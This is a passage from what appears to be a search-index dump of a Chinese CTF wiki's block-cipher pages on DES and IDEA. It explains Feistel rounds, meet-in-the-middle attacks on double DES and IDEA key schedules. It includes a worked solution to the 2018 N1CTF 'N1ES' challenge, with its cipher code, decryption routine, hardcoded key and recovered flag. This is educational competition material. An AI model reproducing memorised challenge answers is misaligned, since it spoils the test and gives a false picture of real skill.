, 166 , 31 , 41 , 5 , 189 , 27 ] def generate ( o ): k = permutate ( s_box , o ) b = [] for i in range ( 0 , len ( k ), 7 ): b . append ( k [ i : i + 7 ] + [ 1 ]) c = [] for i in range ( 32 ): pos = 0 x = 0 for j in b [ i ]: x += ( j << pos ) pos += 1 c . append (( 0x10001 ** x ) % ( 0x7f )) return c class N1ES : def __init__ ( self , key ): if ( len ( key ) != 24 or isinstance ( key , bytes ) == False ): raise Exception ( \"key must be 24 bytes long\" ) self . key = key self . gen_subkey () def gen_subkey ( self ): o = string_to_bits ( self . key ) k = [] for i in range ( 8 ): o = generate ( o ) k . extend ( o ) o = string_to_bits ([ chr ( c ) for c in o [ 0 : 24 ]]) self . Kn = [] for i in range ( 32 ): self . Kn . append ( map ( chr , k [ i * 8 : i * 8 + 8 ])) return def encrypt ( self , plaintext ): if ( len ( plaintext ) % 16 != 0 or isinstance ( plaintext , bytes ) == False ): raise Exception ( \"plaintext must be a multiple of 16 in length\" ) res = '' for i in range ( len ( plaintext ) / 16 ): block = plaintext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ round_cnt ])) L , R = R , L res += L + R return res \u663e\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a Feistel \u52a0\u5bc6\u7684\u65b9\u5f0f\uff0c\u89e3\u5bc6\u51fd\u6570\u5982\u4e0b def decrypt ( self , ciphertext ): res = '' for i in range ( len ( ciphertext ) / 16 ): block = ciphertext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ 31 - round_cnt ])) L , R = R , L res += L + R return res \u6700\u540e\u7ed3\u679c\u4e3a \u279c baby_N1ES cat challenge.py from N1ES import N1ES import base64 key = \"wxy191iss00000000000cute\" n1es = N1ES ( key ) flag = \"N1CTF{*****************************************}\" cipher = n1es.encrypt ( flag ) #print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx cipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx' cipher = base64.b64decode ( cipher ) print n1es.decrypt ( cipher ) \u279c baby_N1ES python challenge.py N1CTF { F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/ } \u53c2\u8003 \u00b6 \u6e05\u534e\u5927\u5b66\u7814\u7a76\u751f\u6570\u636e\u5b89\u5168\u8bfe\u7a0b\u8bfe\u4ef6 https://en.wikipedia.org/wiki/Data_Encryption_Standard","title":"DES"},{"location":"crypto/blockcipher/des/#des","text":"","title":"DES"},{"location":"crypto/blockcipher/des/#_1","text":"Data Encryption Standard(DES)\uff0c\u6570\u636e\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165 64 \u4f4d\u3002 \u8f93\u51fa 64 \u4f4d\u3002 \u5bc6\u94a5 64 \u4f4d\uff0c\u4f7f\u7528 64 \u4f4d\u5bc6\u94a5\u4e2d\u7684 56 \u4f4d\uff0c\u5269\u4f59\u7684 8 \u4f4d\u8981\u4e48\u4e22\u5f03\uff0c\u8981\u4e48\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\u3002 Feistel \u8fed\u4ee3\u7ed3\u6784 \u660e\u6587\u7ecf\u8fc7 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002 \u5bc6\u6587\u7ecf\u8fc7\u7c7b\u4f3c\u7684 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u660e\u6587\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/blockcipher/des/#_2","text":"\u7ed9\u51fa\u4e00\u5f20\u7b80\u5355\u7684 DES \u6d41\u7a0b\u56fe \u3002","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/blockcipher/des/#_3","text":"\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u6bcf\u4e00\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b L_{i+1}=R_i L_{i+1}=R_i R_{i+1}=L_i\\oplus F(R_i,K_i) R_{i+1}=L_i\\oplus F(R_i,K_i) \u90a3\u4e48\u5728\u6700\u540e\u7684 Permutation \u4e4b\u524d\uff0c\u5bf9\u5e94\u7684\u5bc6\u6587\u4e3a (R_{n+1},L_{n+1}) (R_{n+1},L_{n+1}) \u3002","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/des/#_4","text":"\u90a3\u4e48\u89e3\u5bc6\u5982\u4f55\u89e3\u5bc6\u5462\uff1f\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u628a\u5bc6\u6587\u5148\u8fdb\u884c\u9006\u7f6e\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u4e00\u8f6e\u7684\u8f93\u51fa\u3002\u6211\u4eec\u8fd9\u65f6\u8003\u8651\u6bcf\u4e00\u8f6e R_i=L_{i+1} R_i=L_{i+1} L_i=R_{i+1}\\oplus F(L_{i+1},K_i) L_i=R_{i+1}\\oplus F(L_{i+1},K_i) \u56e0\u6b64\uff0c (L_0,R_0) (L_0,R_0) \u5c31\u662f\u52a0\u5bc6\u65f6\u7b2c\u4e00\u6b21\u7f6e\u6362\u540e\u7684\u660e\u6587\u3002\u6211\u4eec\u53ea\u9700\u8981\u518d\u6267\u884c\u9006\u7f6e\u6362\u5c31\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\u4e86\u3002 \u53ef\u4ee5\u770b\u51fa\uff0cDES \u52a0\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u5957\u903b\u8f91\uff0c\u53ea\u662f\u5bc6\u94a5\u4f7f\u7528\u7684\u987a\u5e8f\u4e0d\u4e00\u81f4\u3002","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/des/#_5","text":"DES \u4e2d\u7684\u6838\u5fc3\u90e8\u4ef6\u4e3b\u8981\u5305\u62ec\uff08\u8fd9\u91cc\u53ea\u7ed9\u51fa\u52a0\u5bc6\u8fc7\u7a0b\u7684\uff09 \u521d\u59cb\u7f6e\u6362 F \u51fd\u6570 E \u6269\u5c55\u51fd\u6570 S \u76d2\uff0c\u8bbe\u8ba1\u6807\u51c6\u672a\u7ed9\u51fa\u3002 P \u7f6e\u6362 \u6700\u540e\u7f6e\u6362 \u5176\u4e2d F \u51fd\u6570\u5982\u4e0b \u5982\u679c\u5bf9 DES \u66f4\u52a0\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u8fdb\u884c\u66f4\u52a0\u4ed4\u7ec6\u5730\u7814\u7a76\u3002\u6b22\u8fce\u63d0\u4f9b PR\u3002","title":"\u6838\u5fc3\u90e8\u4ef6"},{"location":"crypto/blockcipher/des/#_6","text":"\u5728 DES \u7684\u57fa\u7840\u4e0a\uff0c\u884d\u751f\u4e86\u4ee5\u4e0b\u4e24\u79cd\u52a0\u5bc6\u65b9\u5f0f \u53cc\u91cd DES \u4e09\u79cd DES","title":"\u884d\u751f"},{"location":"crypto/blockcipher/des/#des_1","text":"\u53cc\u91cd DES \u4f7f\u7528\u4e24\u4e2a\u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 112 \u6bd4\u7279\u3002\u52a0\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k2}(E_{k1}(P)) C=E_{k2}(E_{k1}(P)) \u4f46\u662f\u53cc\u91cd DES \u4e0d\u80fd\u62b5\u6297\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u4e24\u4e2a\u96c6\u5408 I={E_{k1}(P)} I={E_{k1}(P)} J=D_{k2}(C) J=D_{k2}(C) \u5373\u5206\u522b\u679a\u4e3e K1 \u548c K2 \u5206\u522b\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u548c\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u3002 \u5728\u6211\u4eec\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u5b8c\u6bd5\u540e\uff0c\u53ef\u4ee5\u5bf9\u52a0\u5bc6\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd9\u6837\u7684\u590d\u6742\u5ea6\u4e3a 2^nlog(2^n)=O(n2^n) 2^nlog(2^n)=O(n2^n) \u5f53\u6211\u4eec\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u65f6\uff0c\u53ef\u4ee5\u6bcf\u89e3\u5bc6\u4e00\u4e2a\uff0c\u5c31\u53bb\u5bf9\u5e94\u7684\u8868\u4e2d\u67e5\u8be2\u3002 \u603b\u7684\u590d\u6742\u5ea6\u4e3a\u8fd8\u662f O(n2^n) O(n2^n) \u3002","title":"\u53cc\u91cd DES"},{"location":"crypto/blockcipher/des/#des_2","text":"\u4e09\u91cd DES \u7684\u52a0\u89e3\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k3}(D_{k2}(E_{k1}(P))) C=E_{k3}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k3}(C))) P=D_{k1}(E_{k2}(D_{k3}(C))) \u5728\u9009\u62e9\u5bc6\u94a5\u65f6\uff0c\u53ef\u4ee5\u6709\u4e24\u79cd\u65b9\u6cd5 3 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1\uff0ck2\uff0ck3 \u4e92\u76f8\u72ec\u7acb\uff0c\u4e00\u5171 168 \u6bd4\u7279\u3002 2 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1 \u4e0e k2 \u72ec\u7acb\uff0ck3=k1\uff0c112 \u6bd4\u7279\u3002","title":"\u4e09\u91cd DES"},{"location":"crypto/blockcipher/des/#_7","text":"\u5dee\u5206\u653b\u51fb \u7ebf\u6027\u653b\u51fb","title":"\u653b\u51fb\u65b9\u6cd5"},{"location":"crypto/blockcipher/des/#2018-n1ctf-n1es","text":"\u57fa\u672c\u4ee3\u7801\u5982\u4e0b # -*- coding: utf-8 -*- def round_add ( a , b ): f = lambda x , y : x + y - 2 * ( x & y ) res = '' for i in range ( len ( a )): res += chr ( f ( ord ( a [ i ]), ord ( b [ i ]))) return res def permutate ( table , block ): return list ( map ( lambda x : block [ x ], table )) def string_to_bits ( data ): data = [ ord ( c ) for c in data ] l = len ( data ) * 8 result = [ 0 ] * l pos = 0 for ch in data : for i in range ( 0 , 8 ): result [( pos << 3 ) + i ] = ( ch >> i ) & 1 pos += 1 return result s_box = [ 54 , 132 , 138 , 83 , 16 , 73 , 187 , 84 , 146 , 30 , 95 , 21 , 148 , 63 , 65 , 189 , 188 , 151 , 72 , 161 , 116 , 63 , 161 , 91 , 37 , 24 , 126 , 107 , 87 , 30 , 117 , 185 , 98 , 90 , 0 , 42 , 140 , 70 , 86 , 0 , 42 , 150 , 54 , 22 , 144 , 153 , 36 , 90 , 149 , 54 , 156 , 8 , 59 , 40 , 110 , 56 , 1 , 84 , 103 , 22 , 65 , 17 , 190 , 41 , 99 , 151 , 119 , 124 , 68 , 17 , 166 , 125 , 95 , 65 , 105 , 133 , 49 , 19 , 138 , 29 , 110 , 7 , 81 , 134 , 70 , 87 , 180 , 78 , 175 , 108 , 26 , 121 , 74 , 29 , 68 , 162 , 142 , 177 , 143 , 86 , 129 , 101 , 117 , 41 , 57 , 34 , 177 , 103 , 61 , 135 , 191 , 74 , 69 , 147 , 90 , 49 , 135 , 124 , 106 , 19 , 8 9 , 38 , 21 , 41 , 17 , 155 , 83 , 38 , 159 , 179 , 19 , 157 , 68 , 105 , 151 , 166 , 171 , 122 , 179 , 114 , 52 , 183 , 89 , 107 , 113 , 65 , 161 , 141 , 18 , 121 , 95 , 4 , 95 , 101 , 81 , 156 , 17 , 190 , 38 , 84 , 9 , 171 , 180 , 59 , 45 , 15 , 34 , 89 , 75 , 164 , 190 , 140 , 6 , 41 , 188 , 77 , 165 , 105 , 5 , 107 , 31 , 183 , 107 , 141 , 66 , 63 , 10 , 9 , 125 , 50 , 2 , 153 , 156 , 162 , 186 , 76 , 158 , 153 , 117 , 9 , 77 , 156 , 11 , 145 , 12 , 169 , 52 , 57 , 161 , 7 , 158 , 110 , 191 , 43 , 82 , 186 , 49 , 102 , 166 , 31 , 41 , 5 , 189 , 27 ] def generate ( o ): k = permutate ( s_box , o ) b = [] for i in range ( 0 , len ( k ), 7 ): b . append ( k [ i : i + 7 ] + [ 1 ]) c = [] for i in range ( 32 ): pos = 0 x = 0 for j in b [ i ]: x += ( j << pos ) pos += 1 c . append (( 0x10001 ** x ) % ( 0x7f )) return c class N1ES : def __init__ ( self , key ): if ( len ( key ) != 24 or isinstance ( key , bytes ) == False ): raise Exception ( \"key must be 24 bytes long\" ) self . key = key self . gen_subkey () def gen_subkey ( self ): o = string_to_bits ( self . key ) k = [] for i in range ( 8 ): o = generate ( o ) k . extend ( o ) o = string_to_bits ([ chr ( c ) for c in o [ 0 : 24 ]]) self . Kn = [] for i in range ( 32 ): self . Kn . append ( map ( chr , k [ i * 8 : i * 8 + 8 ])) return def encrypt ( self , plaintext ): if ( len ( plaintext ) % 16 != 0 or isinstance ( plaintext , bytes ) == False ): raise Exception ( \"plaintext must be a multiple of 16 in length\" ) res = '' for i in range ( len ( plaintext ) / 16 ): block = plaintext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ round_cnt ])) L , R = R , L res += L + R return res \u663e\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a Feistel \u52a0\u5bc6\u7684\u65b9\u5f0f\uff0c\u89e3\u5bc6\u51fd\u6570\u5982\u4e0b def decrypt ( self , ciphertext ): res = '' for i in range ( len ( ciphertext ) / 16 ): block = ciphertext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ 31 - round_cnt ])) L , R = R , L res += L + R return res \u6700\u540e\u7ed3\u679c\u4e3a \u279c baby_N1ES cat challenge.py from N1ES import N1ES import base64 key = \"wxy191iss00000000000cute\" n1es = N1ES ( key ) flag = \"N1CTF{*****************************************}\" cipher = n1es.encrypt ( flag ) #print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx cipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx' cipher = base64.b64decode ( cipher ) print n1es.decrypt ( cipher ) \u279c baby_N1ES python challenge.py N1CTF { F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/ }","title":"2018 N1CTF N1ES"},{"location":"crypto/blockcipher/des/#_8","text":"\u6e05\u534e\u5927\u5b66\u7814\u7a76\u751f\u6570\u636e\u5b89\u5168\u8bfe\u7a0b\u8bfe\u4ef6 https://en.wikipedia.org/wiki/Data_Encryption_Standard","title":"\u53c2\u8003"},{"location":"crypto/blockcipher/idea/","text":"IDEA \u00b6 \u6982\u8ff0 \u00b6 \u56fd\u9645\u6570\u636e\u52a0\u5bc6\u7b97\u6cd5 \uff08International Data Encryption Algorithm\uff0cIDEA\uff09\uff0c\u6700\u65e9\u79f0\u4e3a \u6539\u826f\u5efa\u8bae\u52a0\u5bc6\u6807\u51c6 \uff08Improved Proposed Encryption Standard\uff0cIPES\uff09\uff0c\u662f\u5bc6\u7801\u5b66\u4e0a\u4e00\u79cd\u5bf9\u79f0\u5bc6\u94a5\u5206\u7ec4\u5bc6\u7801\uff0c\u7531 James Massey \u4e0e\u6765\u5b66\u5609\u8bbe\u8ba1\uff0c\u57281991\u5e74\u9996\u6b21\u63d0\u51fa\u3002\u8fd9\u4e2a\u7b97\u6cd5\u7684\u63d0\u51fa\uff0c\u662f\u4e3a\u4e86\u53d6\u4ee3\u65e7\u6709\u7684\u6570\u636e\u52a0\u5bc6\u6807\u51c6 DES\u3002\uff08\u6765\u81ea\u7ef4\u57fa\u767e\u79d1\uff09 \u57fa\u672c\u6d41\u7a0b \u00b6 \u5bc6\u94a5\u751f\u6210 \u00b6 IDEA \u5728\u52a0\u5bc6\u7684\u6bcf\u8f6e\u4e2d\u4f7f\u7528 6\u4e2a\u5bc6\u94a5\uff0c\u7136\u540e\u6700\u540e\u8f93\u51fa\u8f6e\u4f7f\u75284\u4e2a\u5bc6\u94a5\u3002\u6240\u4ee5\u4e00\u5171\u670952\u4e2a\u3002 \u524d8\u4e2a\u5bc6\u94a5\u6765\u81ea\u4e0e\u8be5\u7b97\u6cd5\u6700\u521d\u7684\u5bc6\u94a5\uff0cK1 \u53d6\u81ea\u5bc6\u94a5\u7684\u9ad816\u6bd4\u7279\uff0cK8 \u53d6\u81ea\u5bc6\u94a5\u7684\u4f4e16\u6bd4\u7279\u3002 \u5c06\u5bc6\u94a5\u5faa\u73af\u5de6\u79fb 25 \u4f4d\u83b7\u53d6\u4e0b\u4e00\u8f6e\u5bc6\u94a5\uff0c\u7136\u540e\u518d\u6b21\u5206\u4e3a8\u7ec4\u3002 \u52a0\u5bc6\u6d41\u7a0b \u00b6 IDEA \u52a0\u5bc6\u7684\u6570\u636e\u5757\u7684\u5927\u5c0f\u4e3a 64 \u6bd4\u7279\uff0c\u5176\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u4e3a128 \u6bd4\u7279\u3002\u8be5\u7b97\u6cd5\u4f1a\u5bf9\u8f93\u5165\u7684\u6570\u636e\u5757\u8fdb\u884c8\u6b21\u76f8\u540c\u7684\u53d8\u6362\uff0c\u53ea\u662f\u6bcf\u6b21\u4f7f\u7528\u7684\u5bc6\u94a5\u4e0d\u540c\uff0c\u6700\u540e\u4f1a\u8fdb\u884c\u4e00\u6b21\u8f93\u51fa\u53d8\u6362\u3002\u6bcf\u4e00\u8f6e\u7684\u64cd\u4f5c \u53ef\u4ee5\u8f93\u5165\u548c\u8f93\u51fa\u90fd\u662f 16 \u6bd4\u7279\u4f4d\u4e00\u7ec4\u3002\u6bcf\u4e00\u8f6e\u7684\u4e3b\u8981\u6267\u884c\u7684\u8fd0\u7b97\u6709 \u6309\u4f4d\u5f02\u6216\uff0c\u2295 \u6a21\u52a0\uff0c\u6a21\u6570\u4e3a 2^{16} 2^{16} \uff0c\u229e \u6a21\u4e58\uff0c\u6a21\u6570\u4e3a 2^{16}+1 2^{16}+1 \uff0c\u2299\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f 0x0000 \u7684\u8f93\u5165\u4f1a\u88ab\u4fee\u6539\u4e3a 2^{16} 2^{16} \uff0c 2^{16} 2^{16} \u7684\u8f93\u51fa\u7ed3\u679c\u4f1a\u88ab\u4fee\u6539\u4e3a0x0000\u3002 \u8fd9\u91cc\u6211\u4eec\u79f0\u7531 K5\uff0cK6 \u6784\u6210\u7684\u4e2d\u95f4\u90a3\u4e2a\u65b9\u683c\u7684\u52a0\u5bc6\u65b9\u5f0f\u4e3aMA\u3002\u8fd9\u4e5f\u662f IDEA \u7b97\u6cd5\u4e2d\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u6b64\u5916\uff0c\u6211\u4eec\u79f0 MA_L \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u5de6\u4fa7\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u6700\u5de6\u8fb9\u7684 16 \u6bd4\u7279\u64cd\u4f5c\uff1bMA_R \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u53f3\u534a\u90e8\u5206\u7684\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u7b2c\u4e09\u4e2a 16 \u6bd4\u7279\u64cd\u4f5c\u3002 \u5728\u6700\u540e\u8f93\u51fa\u8f6e\u7684\u64cd\u4f5c\u5982\u4e0b \u89e3\u5bc6\u6d41\u7a0b \u00b6 \u89e3\u5bc6\u6d41\u7a0b\u4e0e\u52a0\u5bc6\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4e3b\u8981\u5728\u4e8e\u5176\u5bc6\u94a5\u7684\u9009\u53d6 \u7b2c i(1-9) \u8f6e\u7684\u89e3\u5bc6\u7684\u5bc6\u94a5\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u7531\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u7b2c10-i \u8f6e\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u5f97\u51fa \u5176\u4e2d\u7b2c 1 \u4e2a\u548c\u7b2c 4 \u4e2a\u89e3\u5bc6\u5b50\u5bc6\u94a5\u4e3a\u76f8\u5e94\u7684\u5b50\u5bc6\u94a5\u5173\u4e8e 2^{16}+1 2^{16}+1 \u7684\u4e58\u6cd5\u9006\u5143\u3002 \u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u7684\u53d6\u6cd5\u4e3a \u5f53\u8f6e\u6570\u4e3a2\uff0c...\uff0c8\u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c3\u4e2a\u548c\u7b2c2\u4e2a\u7684\u5b50\u5bc6\u94a5\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u5f53\u8f6e\u6570\u4e3a 1 \u6216 9 \u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u5bf9\u5e94\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u7b2c 5 \u548c\u7b2c 6 \u4e2a\u5bc6\u94a5\u4e0d\u53d8\u3002 \u603b\u4f53\u6d41\u7a0b \u00b6 \u6211\u4eec\u6765\u8bc1\u660e\u4e00\u4e0b\u7b97\u6cd5\u7684\u6b63\u786e\u6027\uff0c\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e8e\u89e3\u5bc6\u7b97\u6cd5\u7684\u7b2c\u4e00\u8f6e\uff0c\u9996\u5148\u6211\u4eec\u5148\u770b\u4e00\u4e0b Y_i Y_i \u662f\u5982\u4f55\u5f97\u5230\u7684 Y_1 = W_{81} \\odot Z_{49} Y_1 = W_{81} \\odot Z_{49} Y_2=W_{83}\\boxplus Z_{50} Y_2=W_{83}\\boxplus Z_{50} Y_3=W_{82}\\boxplus Z_{51} Y_3=W_{82}\\boxplus Z_{51} Y_4=W_{83}\\odot Z_{52} Y_4=W_{83}\\odot Z_{52} \u89e3\u5bc6\u65f6\uff0c\u7b2c\u4e00\u8f6e\u76f4\u63a5\u8fdb\u884c\u7684\u53d8\u6362\u4e3a J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} \u53ef\u4ee5\u770b\u51fa\u5f97\u5230\u7684\u7ed3\u679c\u53ea\u6709\u4e2d\u95f4\u7684\u4e24\u4e2a16\u4f4d\u52a0\u5bc6\u7ed3\u679c\u6070\u597d\u76f8\u53cd\u3002\u6211\u4eec\u8fdb\u4e00\u6b65\u770b\u4e00\u4e0b W_{8i} W_{8i} \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) \u90a3\u4e48\u5bf9\u4e8eV11\u6765\u8bf4 V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) \u901a\u8fc7\u7b80\u5355\u5e26\u5165\u5df2\u6709\u7684\u503c\uff0c\u663e\u7136 V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} \u5bf9\u4e8e\u5176\u4ed6\u7684\u5143\u7d20\u4e5f\u7c7b\u4f3c\uff0c\u90a3\u4e48\u5176\u5b9e\u6211\u4eec\u4f1a\u53d1\u73b0\u7b2c\u4e00\u8f6e\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u6070\u597d\u662f I_{81},I_{83},I_{82},I_{84} I_{81},I_{83},I_{82},I_{84} \u3002 \u7c7b\u4f3c\u5730\uff0c\u8fd9\u4e2a\u5173\u7cfb\u53ef\u4ee5\u4e00\u76f4\u6ee1\u8db3\u76f4\u5230 V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} \u90a3\u4e48\u6700\u540e\u518d\u7ecf\u8fc7\u4e00\u6b21\u7b80\u5355\u7684\u8f93\u51fa\u53d8\u6362\uff0c\u6070\u597d\u5f97\u5230\u6700\u521d\u52a0\u5bc6\u7684\u6570\u503c\u3002 \u9898\u76ee \u00b6 2017 HITCON seccomp","title":"IDEA"},{"location":"crypto/blockcipher/idea/#idea","text":"","title":"IDEA"},{"location":"crypto/blockcipher/idea/#_1","text":"\u56fd\u9645\u6570\u636e\u52a0\u5bc6\u7b97\u6cd5 \uff08International Data Encryption Algorithm\uff0cIDEA\uff09\uff0c\u6700\u65e9\u79f0\u4e3a \u6539\u826f\u5efa\u8bae\u52a0\u5bc6\u6807\u51c6 \uff08Improved Proposed Encryption Standard\uff0cIPES\uff09\uff0c\u662f\u5bc6\u7801\u5b66\u4e0a\u4e00\u79cd\u5bf9\u79f0\u5bc6\u94a5\u5206\u7ec4\u5bc6\u7801\uff0c\u7531 James Massey \u4e0e\u6765\u5b66\u5609\u8bbe\u8ba1\uff0c\u57281991\u5e74\u9996\u6b21\u63d0\u51fa\u3002\u8fd9\u4e2a\u7b97\u6cd5\u7684\u63d0\u51fa\uff0c\u662f\u4e3a\u4e86\u53d6\u4ee3\u65e7\u6709\u7684\u6570\u636e\u52a0\u5bc6\u6807\u51c6 DES\u3002\uff08\u6765\u81ea\u7ef4\u57fa\u767e\u79d1\uff09","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/idea/#_2","text":"","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_3","text":"IDEA \u5728\u52a0\u5bc6\u7684\u6bcf\u8f6e\u4e2d\u4f7f\u7528 6\u4e2a\u5bc6\u94a5\uff0c\u7136\u540e\u6700\u540e\u8f93\u51fa\u8f6e\u4f7f\u75284\u4e2a\u5bc6\u94a5\u3002\u6240\u4ee5\u4e00\u5171\u670952\u4e2a\u3002 \u524d8\u4e2a\u5bc6\u94a5\u6765\u81ea\u4e0e\u8be5\u7b97\u6cd5\u6700\u521d\u7684\u5bc6\u94a5\uff0cK1 \u53d6\u81ea\u5bc6\u94a5\u7684\u9ad816\u6bd4\u7279\uff0cK8 \u53d6\u81ea\u5bc6\u94a5\u7684\u4f4e16\u6bd4\u7279\u3002 \u5c06\u5bc6\u94a5\u5faa\u73af\u5de6\u79fb 25 \u4f4d\u83b7\u53d6\u4e0b\u4e00\u8f6e\u5bc6\u94a5\uff0c\u7136\u540e\u518d\u6b21\u5206\u4e3a8\u7ec4\u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/blockcipher/idea/#_4","text":"IDEA \u52a0\u5bc6\u7684\u6570\u636e\u5757\u7684\u5927\u5c0f\u4e3a 64 \u6bd4\u7279\uff0c\u5176\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u4e3a128 